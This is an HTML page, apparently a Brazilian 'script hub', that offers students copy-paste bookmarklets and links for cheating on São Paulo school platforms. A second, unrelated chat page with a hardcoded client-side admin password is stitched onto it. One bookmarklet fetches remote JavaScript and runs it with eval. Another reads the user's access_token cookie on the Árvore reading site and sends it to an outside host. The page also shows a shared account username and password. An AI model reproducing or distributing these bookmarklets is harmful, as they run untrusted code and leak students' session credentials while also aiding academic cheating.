<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>KziN | Script Hub</title>
  
  
  <style>
   

    @keyframes slideFadeInOut {
      0% {
        opacity: 0;
        transform: translateY(-20px);
      }
      10%, 90% {
        opacity: 1;
        transform: translateY(0);
      }
      100% {
        opacity: 0;
        transform: translateY(-20px);
      }
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html {
      height: 100%;
    }

    body {
  min-height: 100%;
  background: #000000;
  font-family: 'Poppins', sans-serif;
  color: white;
  overflow-y: auto;
  transform: scale(0.9,2,1);           /*  Aqui é o zoom */
  transform-origin: top center ;    /*  Mantém o zoom vindo de cima */
}


    

    @keyframes welcome-in {
      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    @keyframes welcome-out {
      to {
        opacity: 0;
        transform: translateY(-50px);
      }
    }

    #site-content {
      display: none;
      padding: 20px;
    }

    header {
      background: #000000;
      padding: 2rem;
      text-align: center;
      border-bottom: 2px solid #2c2c2c;
    }

    :root {
  --color1: 255, 0, 255;      /* rosa */
  --color2: 0, 255, 255;      /* ciano */
  --color3: 255, 255, 0;      /* amarelo */
  --color4: 0, 255, 0;        /* verde */
  --color5: 255, 165, 0;      /* laranja */
  --color6: 128, 0, 128;
  --color7: 75, 0, 130;
  --color8: 255, 20, 147;
  --color9: 0, 128, 128;
  --color10: 173, 255, 47;
  --color11: 255, 69, 0;
  --color12: 255, 140, 0;
  --color13: 240, 230, 140;
  --color14: 34, 139, 34;
  --color15: 0, 191, 255;
  --color16: 199, 21, 133;
  --color17: 218, 112, 214;
  --color18: 255, 0, 0;
  --color19: 255, 192, 203;
  --color20: 64, 224, 208;
  --color21: 0, 255, 127;
  --color22: 127, 255, 0;
  --color23: 255, 215, 0;
  --color24: 255, 105, 180;
  --color25: 0, 100, 0;
  --color26: 72, 61, 139;
  --color27: 255, 69, 0;
  --color28: 173, 216, 230;
  --color29: 238, 130, 238;
  --color30: 255, 20, 147;
  --color31: 0, 255, 255;
  --color32: 0, 128, 128;
  --color33: 128, 128, 0;
  --color34: 210, 105, 30;
  --color35: 255, 0, 255;
  --color36: 138, 43, 226;
  --color37: 0, 255, 127;
  --color38: 127, 255, 212;
  --color39: 255, 165, 0;
  --color40: 0, 100, 255;
  --color41: 255, 69, 0;
  --color42: 255, 20, 147;
  --color43: 218, 165, 32;
  --color44: 0, 206, 209;
  --color45: 255, 182, 193;
  --color46: 32, 178, 170;
  --color47: 199, 21, 133;
  --color48: 255, 255, 0;
  --color49: 0, 128, 0;
  --color50: 255, 0, 0;
}


header h1 {
  font-size: 4rem;
  background: linear-gradient(
    12345deg,
    rgb(var(--color1)),
    rgb(var(--color2)),
    rgb(var(--color3)),
    rgb(var(--color4)),
    rgb(var(--color5)),
    rgb(var(--color6)),
    rgb(var(--color7)),
    rgb(var(--color8)),
    rgb(var(--color9)),
    rgb(var(--color10)),
    rgb(var(--color11)),
    rgb(var(--color12)),
    rgb(var(--color13)),
    rgb(var(--color14)),
    rgb(var(--color15)),
    rgb(var(--color16)),
    rgb(var(--color17)),
    rgb(var(--color18)),
    rgb(var(--color19)),
    rgb(var(--color20)),
    rgb(var(--color21)),
    rgb(var(--color22)),
    rgb(var(--color23)),
    rgb(var(--color24)),
    rgb(var(--color25)),
    rgb(var(--color26)),
    rgb(var(--color27)),
    rgb(var(--color28)),
    rgb(var(--color29)),
    rgb(var(--color30)),
    rgb(var(--color31)),
    rgb(var(--color32)),
    rgb(var(--color33)),
    rgb(var(--color34)),
    rgb(var(--color35)),
    rgb(var(--color36)),
    rgb(var(--color37)),
    rgb(var(--color38)),
    rgb(var(--color39)),
    rgb(var(--color40)),
    rgb(var(--color41)),
    rgb(var(--color42)),
    rgb(var(--color43)),
    rgb(var(--color44)),
    rgb(var(--color45)),
    rgb(var(--color46)),
    rgb(var(--color47)),
    rgb(var(--color48)),
    rgb(var(--color49)),
    rgb(var(--color50))
  );
  background-size: 500% 100%;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  animation: moveGradient 120s linear infinite; /*  mais devagar */
}


@keyframes moveGradient {
  0% { background-position: 0% 0%; }
  100% { background-position: 100% 0%; }
}





    nav {
      display: flex;
      justify-content: center;
      gap: 1rem;
      background: #000000;
      border-bottom: 2px solid #2c2c2c;
    }

    nav button {
      background: #222;
      color: #00ccff;
      border: none;
      padding: 1rem 2rem;
      cursor: pointer;
      font-size: 1.2rem;
      border-bottom: 3px solid transparent;
      transition: border-color 0.3s, background-color 0.3s, box-shadow 0.3s, transform 0.3s;
    }

    nav button:hover {
      background-color: #00aaff;
      box-shadow: 0 0 8px #00aaff;
      transform: scale(1.05);
    }

    nav button.active {
      border-bottom: 3px solid #00ccff;
      font-weight: bold;
    }

    section {
      padding: 2rem;
      border-bottom: 1px solid #2c2c2c;
    }

    .section-header {
      display: flex;
      align-items: center;
      gap: 1rem;
      margin-bottom: 1rem;
      color: #00ccff;
    }

    .section-header img {
      width: 180px;
      height: auto;
      flex-shrink: 0;
    }

    .section-header h2 {
      font-size: 2rem;
      margin: 0;
    }

    .script-box {
      background: #1e1e1e;
      padding: 1rem;
      border-radius: 8px;
      position: relative;
      overflow-x: hidden;
      overflow-y: hidden;
      max-width: 100%;
      height: 3.5rem;
    }

    .script-box code {
      display: inline-block;
      white-space: nowrap;
      color: #fff;
    }

    .copy-btn {
      position: absolute;
      top: 10px;
      right: 10px;
      background: #00ccff;
      color: #000;
      border: none;
      padding: 0.4rem 0.8rem;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s, box-shadow 0.3s, transform 0.3s;
    }

    .copy-btn:hover {
      background: #00aacc;
      box-shadow: 0 0 8px #00aacc;
      transform: scale(1.1);
    }

    .content-section {
      display: none;
    }

    .content-section.active {
      display: block;
    }

    .pdf-box {
      background: #1e1e1e;
      padding: 1rem;
      margin-bottom: 1rem;
      border-radius: 8px;
    }

    .pdf-box h3 {
      margin-top: 0;
      color: #00ccff;
    }

    .pdf-box a {
      display: inline-block;
      margin-top: 0.5rem;
      padding: 0.5rem 1rem;
      background: #00ccff;
      color: #000;
      text-decoration: none;
      border-radius: 5px;
      font-weight: bold;
    }

    .mode-pc {
      position: fixed;
      bottom: 10px;
      left: 10px;
      background: #00ff88;
      color: #000;
      padding: 0.5rem 1rem;
      border-radius: 5px;
      font-weight: bold;
      display: none;
      z-index: 999;
    }

    footer {
      text-align: center;
      margin-top: 2rem;
      padding: 1rem;
      background: #000000;
      border-top: 1px solid #2c2c2c;
      color: #888;
    }
  </style>
</head>
<body>


    <header>
      <h1>KZIN</h1>
    </header>

    <nav>
      <button id="btn-script" class="active">Scripts</button>
      <button id="btn-apostila">Apostilas</button>
    </nav>

    <!-- Seção de Scripts -->
<div id="content-script" class="content-section active">

  <section style="margin-bottom: 70px;">
    <div class="section-header">
      <h2>Tarefa Sp | Sala Do Futuro</h2>
    </div>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>https://moonscripts.cloud/</code>
    </div>
    <p class="pc-label">Script para PC</p>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>https://cenouritos.vercel.app/</code>
    </div>
  </section>

  <section style="margin-bottom: 70px;">
    <div class="section-header">
      <h2>Khan Academy</h2>
    </div>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>https://cenouristo-khan-academy-cva-q7wx.vercel.app</code>
    </div>
    <p class="pc-label">Script para PC</p>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>https://cenouristo-khan-academy-cva-q7wx.vercel.app</code>
    </div>
<p></p>
  <p>Usuário:  MARVOS</p>
  <p>Senha:  CVA123</p>
<p></p>
  </section>

  <section style="margin-bottom: 70px;">
    <div class="section-header">
      <h2>Speak | SP</h2>
    </div>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>javascript:fetch('https://res.cloudinary.com/dtp29k95n/raw/upload/v1750961477/book_dwju2r.js').then(r=>r.text()).then(r=>eval(r))</code>
    </div>
    <p class="pc-label">Script para PC</p>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>https://speakify.cupiditys.lol/</code>
    </div>
  </section>

  <section style="margin-bottom: 70px;">
    <div class="section-header">
      <h2>Redação Paulista</h2>
    </div>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>https://redacao.cupiditys.lol/</code>
    </div>
    <p class="pc-label">Script para PC</p>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>https://exemplo.com/redacao-pc</code>
    </div>
  </section>

  <section>
    <div class="section-header">
      <h2>Leia | SP</h2>
    </div>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>javascript:!function(){if('livros.arvore.com.br'!==location.host)return alert('Este script só funciona no Árvore!');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split('access_token=')[1].split(';')[0]))}`)}();</code>
    </div>
    <p class="pc-label">Script para PC</p>
    <div class="script-box">
      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
      <code>https://leiasp.cupiditys.lol/</code>
</section>
</div>

<style>
.section-header {
  font-size: 14px;
  color: #00FFFF
;
  margin: 5px 0;
  font-style: italic;

</style>

<style>
.pc-label {
  font-size: 14px;
  color: #00FFFF
;
  margin: 5px 0;
  font-style: italic;

</style>



    <!-- Seção de Apostilas -->
    <div id="content-apostila" class="content-section">
      <section>
        <div class="section-header">
          <h2>1° Série - Apostilas</h2>
        </div>

        <div class="pdf-box">
          <h3>Física, Biologia, Química - Volume 3</h3>
          <a href="https://www.mediafire.com/file/1o0np74g4qdjep9/F%C3%ADsica%2C_Biologia%2C_Qu%C3%ADmica_-_Volume_3.pdf/file" target="_blank"> Baixar PDF</a>
        </div>

        <div class="pdf-box">
          <h3>Matemática e Língua Portuguesa - Volume 3</h3>
          <a href="https://www.mediafire.com/file/i7hnmiq17t86px1/Matem%C3%A1tica_e_L%C3%ADngua_Portuguesa_-_Volume_3.pdf/file" target="_blank"> Baixar PDF</a>
        </div>

        <div class="pdf-box">
          <h3>História e Geografia - Volume 3</h3>
          <a href="https://www.mediafire.com/file/fg9md25e5ty2wkb/Hist%C3%B3ria_e_Geografia_-_Volume_3.pdf/file" target="_blank"> Baixar PDF</a>
        </div>
      </section>
    </div>

    <footer>
      Desenvolvido por Kauã © 2025
    </footer>
  </div>

  <script>
    const welcome = document.getElementById('welcome-screen');
    const content = document.getElementById('site-content');

    setTimeout(() => {
      welcome.style.display = 'none';
      content.style.display = 'block';
      document.body.style.overflowY = 'auto';
    }, 4000);

    const btnScript = document.getElementById('btn-script');
    const btnApostila = document.getElementById('btn-apostila');
    const contentScript = document.getElementById('content-script');
    const contentApostila = document.getElementById('content-apostila');

    btnScript.addEventListener('click', () => {
      btnScript.classList.add('active');
      btnApostila.classList.remove('active');
      contentScript.classList.add('active');
      contentApostila.classList.remove('active');
    });

    btnApostila.addEventListener('click', () => {
      btnApostila.classList.add('active');
      btnScript.classList.remove('active');
      contentApostila.classList.add('active');
      contentScript.classList.remove('active');
    });

    function copyScript(btn) {
      const code = btn.parentElement.querySelector("code");
      navigator.clipboard.writeText(code.textContent.trim()).then(() => {
        btn.textContent = "";
        setTimeout(() => btn.textContent = "Copiar", 1500);
      });
    }

    if (new URLSearchParams(window.location.search).get('modo') === 'pc') {
      document.getElementById('modePC').style.display = 'block';
    }
  </script>



</body>
</html>   document.getElementById('modePC').style.display = 'block';
    }
  </script>

  <!-- Box de notificação -->
  <div id="loading-notification"></div>

<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Chat — Bugs / Atualizações / Sugestão</title>
<style>
  :root {
    --bg: #000000;
    --card: #0b1220;
    --muted: #98a0b3;
    --accent: #6ee7b7;
    --glass: rgba(255, 255, 255, 0.03);
    --admin-pink: #e91e63;
    --admin-pink-light: #f48fb1;
    --member-cyan: #00ffff;
  }
  * { box-sizing: border-box; }
  html, body {
    height: 100%;
    margin: 0;
    font-family: Inter, system-ui, sans-serif;
    color: #e6eef8;
    background: var(--bg);
  }
  /* Botão fixo admin login */
  #adminLoginBtn {
    position: fixed; top: 12px; left: 12px;
    background: var(--admin-pink); color: white; font-weight: 700;
    padding: 8px 12px; border-radius: 8px; cursor: pointer; z-index: 1500;
    user-select: none; box-shadow: 0 0 10px var(--admin-pink-light);
    transition: background-color 0.3s ease;
  }
  #adminLoginBtn:hover { background: var(--admin-pink-light); }
  .fab-group {
    position: fixed; right: 20px; bottom: 20px;
    display: flex; flex-direction: column; gap: 12px; z-index: 1200;
  }
  .fab {
    width: 58px; height: 58px; border-radius: 50%;
    background: linear-gradient(135deg, #2b6cb0, #4f46e5);
    display: flex; align-items: center; justify-content: center;
    font-size: 26px; cursor: pointer; box-shadow: 0 10px 30px rgba(0, 0, 0, .6);
  }
  .panel {
    position: fixed; inset: 0; background: var(--card);
    display: flex; flex-direction: column; z-index: 1300;
  }
  .panel.hidden { display: none; }
  .header {
    padding: 12px; background: #081426; display: flex;
    justify-content: center; align-items: center;
    position: relative;
  }
  .header h3 {
    margin: 0; font-size: 18px; text-align: center;
  }
  .header button {
    position: absolute; right: 12px; top: 8px;
    background: none; border: none; color: #fff; font-size: 20px; cursor: pointer;
  }
  .messages {
    flex: 1; overflow-y: auto; padding: 12px;
    display: flex; flex-direction: column; gap: 12px;
  }
  .msg {
    display: flex; gap: 12px; background: rgba(255, 255, 255, 0.02);
    padding: 10px; border-radius: 10px; position: relative;
  }
  .msg.admin {
    background: linear-gradient(90deg, var(--admin-pink-light), var(--admin-pink));
    box-shadow: 0 0 12px var(--admin-pink);
    border: 2px solid var(--admin-pink);
  }
  .avatar {
    width: 60px; height: 60px; border-radius: 50%;
    overflow: hidden; flex-shrink: 0;
    border: 2px solid rgba(110, 231, 183, 0.5);
    box-shadow: 0 0 10px rgba(110, 231, 183, 0.6);
  }
  .avatar img {
    width: 100%; height: 100%; object-fit: cover;
  }
  .bubble { flex: 1; }
  .meta {
    display: flex; gap: 8px; font-size: 14px; font-weight: 600;
    color: var(--muted);
  }
  .meta.admin-name { color: var(--admin-pink); }
  .meta.member-name { color: var(--member-cyan); }
  .text { margin-top: 6px; white-space: pre-wrap; }
  .composer {
    display: flex; gap: 8px; padding: 12px; background: #081426;
  }
  .composer textarea {
    flex: 1; resize: none; border-radius: 10px; padding: 8px;
    border: 0; background: rgba(255, 255, 255, 0.05);
    color: #fff; font-size: 16px; font-family: inherit;
  }
  .composer button {
    background: linear-gradient(90deg, #16a34a, #10b981);
    border: 0; border-radius: 10px; color: #fff;
    padding: 0 16px; cursor: pointer; font-weight: 700;
  }
  /* Menu 3 pontos */
  .msg-menu {
    position: absolute; top: 6px; right: 6px;
    font-size: 18px; color: var(--muted);
    cursor: pointer; user-select: none;
  }
  .msg-menu:hover { color: var(--accent); }
  /* Menu flutuante editar/excluir */
  .edit-menu {
    position: absolute; top: 24px; right: 6px;
    background: var(--card); border: 1px solid var(--muted);
    border-radius: 6px; overflow: hidden; z-index: 2000;
  }
  .edit-menu button {
    display: block; width: 100%; background: none;
    border: none; color: white; padding: 8px 12px;
    text-align: left; cursor: pointer;
  }
  .edit-menu button:hover { background: rgba(255, 255, 255, 0.1); }
  /* Modal Admin Login */
  #adminModal {
    position: fixed; inset: 0; background: rgba(0,0,0,0.75);
    display: none; align-items: center; justify-content: center;
    z-index: 1600;
  }
  #adminModal.active { display: flex; }
  #adminModal .modal-content {
    background: var(--card); padding: 24px; border-radius: 16px;
    width: 320px; box-shadow: 0 0 15px var(--admin-pink);
    display: flex; flex-direction: column; gap: 12px;
  }
  #adminModal label { font-weight: 600; font-size: 14px; color: #ddd; }
  #adminModal input {
    padding: 10px; font-size: 16px; border-radius: 10px;
    border: none; outline: none;
  }
  #adminModal button {
    margin-top: 12px; padding: 12px; background: var(--admin-pink);
    color: white; border: none; border-radius: 12px; font-weight: 700;
    cursor: pointer; box-shadow: 0 0 10px var(--admin-pink-light);
  }
  #adminModal .close-btn {
    position: absolute; top: 16px; right: 20px; font-size: 24px;
    cursor: pointer; color: var(--admin-pink);
  }
  /* Botão logout admin */
  #adminLogoutBtn {
    position: fixed; top: 12px; left: 12px;
    background: #444; color: var(--admin-pink); font-weight: 700;
    padding: 8px 12px; border-radius: 8px; cursor: pointer; z-index: 1500;
    user-select: none; box-shadow: 0 0 10px var(--admin-pink-light);
    display: none;
  }
  #adminLogoutBtn:hover { background: #555; }
</style>
</head>
<body>

<!-- Botão entrar admin -->
<div id="adminLoginBtn" title="Entrar como administrador">Logar Admin</div>
<div id="adminLogoutBtn" title="Sair do modo administrador">Sair Admin</div>

<div class="fab-group" id="fabGroup">
  <div class="fab" data-channel="bugs" title="Relatar Bugs">🐞</div>
  <div class="fab" data-channel="Atualizações" title="Atualizações">🚨</div>
  <div class="fab" data-channel="sugestoes" title="Sugestão">💡</div>
</div>

<div class="panel hidden" id="panel">
  <div class="header">
    <h3 id="panelTitle">Canal</h3>
    <button id="closePanel">✕</button>
  </div>
  <div class="messages" id="messages"></div>
  <form class="composer" id="composer">
    <textarea id="text" placeholder="Escreva sua mensagem..."></textarea>
    <button type="submit">Enviar</button>
  </form>
</div>

<!-- Modal Login Admin -->
<div id="adminModal">
  <div class="modal-content">
    <div class="close-btn" id="closeAdminModal">✕</div>
    <h2>Login Administrador</h2>
    <label for="adminName">Nome</label>
    <input type="text" id="adminName" placeholder="Digite seu nome" value="" />
    <label for="adminPassword">Senha</label>
    <input type="password" id="adminPassword" placeholder="Digite a senha" />
    <button id="adminLoginSubmit">Entrar</button>
  </div>
</div>

<script>
  const adminLoginBtn = document.getElementById('adminLoginBtn');
  const adminLogoutBtn = document.getElementById('adminLogoutBtn');
  const adminModal = document.getElementById('adminModal');
  const closeAdminModal = document.getElementById('closeAdminModal');
  const adminNameInput = document.getElementById('adminName');
  const adminPasswordInput = document.getElementById('adminPassword');
  const adminLoginSubmit = document.getElementById('adminLoginSubmit');
  const fabGroup = document.getElementById('fabGroup');
  const panel = document.getElementById('panel');
  const panelTitle = document.getElementById('panelTitle');
  const messagesEl = document.getElementById('messages');
  const composer = document.getElementById('composer');
  const text = document.getElementById('text');
  const closePanel = document.getElementById('closePanel');

  const ADMIN_NAME = 'kzin';
  const ADMIN_PASS = '123';
  const channels = { bugs: 'Relatar Bugs', Atualizações: 'Atualizações', sugestoes: 'Sugestão' };

  let activeChannel = null;
  let isAdmin = false;
  let clientId = localStorage.getItem('chat_client') || ('c_' + Math.random().toString(36).substr(2,9));
  localStorage.setItem('chat_client', clientId);

  if(localStorage.getItem('chat_isAdmin') === 'true'){
    isAdmin = true;
    adminLoginBtn.style.display = 'none';
    adminLogoutBtn.style.display = 'block';
  }

  function loadMessages(channel){ return JSON.parse(localStorage.getItem('msgs_'+channel) || '[]'); }
  function saveMessages(channel, msgs){ localStorage.setItem('msgs_'+channel, JSON.stringify(msgs)); }

  function render(){
    const msgs = loadMessages(activeChannel);
    messagesEl.innerHTML = '';
    msgs.forEach(m => {
      const wrap = document.createElement('div');
      wrap.className = 'msg';
      if(m.userId === 'admin') wrap.classList.add('admin');

      const avatar = document.createElement('div');
      avatar.className = 'avatar';
      avatar.innerHTML = `<img src="${m.img}" alt="avatar">`;

      const bubble = document.createElement('div');
      bubble.className = 'bubble';

      const meta = document.createElement('div');
      meta.className = 'meta';
      if(m.userId === 'admin'){
        meta.textContent = '[Administrador] KziN • ' + new Date(m.ts).toLocaleString();
        meta.classList.add('admin-name');
      } else {
        meta.textContent = '[Membro] Anônimo • ' + new Date(m.ts).toLocaleString();
        meta.classList.add('member-name');
      }

      const textEl = document.createElement('div');
      textEl.className = 'text';
      textEl.textContent = m.text;

      bubble.appendChild(meta);
      bubble.appendChild(textEl);
      wrap.appendChild(avatar);
      wrap.appendChild(bubble);

      if(isAdmin){
        const menu = document.createElement('div');
        menu.className = 'msg-menu';
        menu.textContent = '⋯';
        menu.addEventListener('click', () => toggleEditMenu(menu, m.id, activeChannel));
        wrap.appendChild(menu);
      }

      messagesEl.appendChild(wrap);
    });
  }

  function toggleEditMenu(button, msgId, channel){
    document.querySelectorAll('.edit-menu').forEach(m => m.remove());
    const menu = document.createElement('div');
    menu.className = 'edit-menu';
    const btnEdit = document.createElement('button');
    btnEdit.textContent = 'Editar';
    btnEdit.onclick = () => { editMessage(msgId, channel); menu.remove(); };
    const btnDelete = document.createElement('button');
    btnDelete.textContent = 'Excluir';
    btnDelete.onclick = () => { deleteMessage(msgId, channel); menu.remove(); };
    menu.appendChild(btnEdit);
    menu.appendChild(btnDelete);
    button.parentElement.appendChild(menu);
  }

  function editMessage(msgId, channel){
    const msgs = loadMessages(channel);
    const msg = msgs.find(m => m.id === msgId);
    if(!msg) return;
    const novoTexto = prompt('Edite a mensagem:', msg.text);
    if(novoTexto !== null && novoTexto.trim() !== ''){
      msg.text = novoTexto.trim();
      saveMessages(channel, msgs);
      render();
    }
  }

  function deleteMessage(msgId, channel){
    const msgs = loadMessages(channel);
    const index = msgs.findIndex(m => m.id === msgId);
    if(index !== -1){
      if(confirm('Tem certeza que deseja excluir?')){
        msgs.splice(index, 1);
        saveMessages(channel, msgs);
        render();
      }
    }
  }

  document.querySelectorAll('.fab').forEach(fab => {
    fab.addEventListener('click', () => {
      activeChannel = fab.dataset.channel;
      panelTitle.textContent = channels[activeChannel];
      fabGroup.style.display = 'none';
      panel.classList.remove('hidden');
      render();
      if(activeChannel === 'Atualizações' && !isAdmin){
        text.disabled = true;
        text.placeholder = 'Somente ' + '%cadmins%c podem enviar mensagem';
        text.placeholder = 'Somente admins podem enviar mensagem';
        text.style.color = '#16a34a';
      } else {
        text.disabled = false;
        text.placeholder = 'Escreva sua mensagem...';
        text.style.color = '#fff';
      }
    });
  });

  closePanel.addEventListener('click', () => {
    panel.classList.add('hidden');
    fabGroup.style.display = 'flex';
  });

  composer.addEventListener('submit', e => {
    e.preventDefault();
    if(!text.value.trim() || (activeChannel === 'Atualizações' && !isAdmin)) return;
    const msgs = loadMessages(activeChannel);
    const newMsg = {
      id: 'm_' + Math.random().toString(36).substr(2,9),
      userId: isAdmin ? 'admin' : clientId,
      name: isAdmin ? '[Administrador] KziN' : '[Membro] Anônimo',
      img: isAdmin
        ? 'https://i.ibb.co/0jXZYmRD/bd72664b-04f3-4297-a90a-0191c2bbbe39.gif'
        : 'https://i.ibb.co/Z6GctB8r/images.jpg',
      text: text.value.trim(),
      ts: Date.now()
    };
    msgs.push(newMsg);
    saveMessages(activeChannel, msgs);
    text.value = '';
    render();
  });

  adminLoginBtn.addEventListener('click', () => {
    adminModal.classList.add('active');
    adminPasswordInput.value = '';
  });
  closeAdminModal.addEventListener('click', () => {
    adminModal.classList.remove('active');
  });
  adminLoginSubmit.addEventListener('click', () => {
    const name = adminNameInput.value.trim();
    const pass = adminPasswordInput.value;
    if(name === ADMIN_NAME && pass === ADMIN_PASS){
      isAdmin = true;
      localStorage.setItem('chat_isAdmin', 'true');
      adminLoginBtn.style.display = 'none';
      adminLogoutBtn.style.display = 'block';
      adminModal.classList.remove('active');
      alert('Login de administrador realizado com sucesso!');
    } else {
      alert('Nome ou senha incorretos!');
    }
  });
  adminLogoutBtn.addEventListener('click', () => {
    isAdmin = false;
    localStorage.removeItem('chat_isAdmin');
    adminLoginBtn.style.display = 'block';
    adminLogoutBtn.style.display = 'none';
    alert('Deslogamento realizado.');
  });
</script>
</body>
</html>
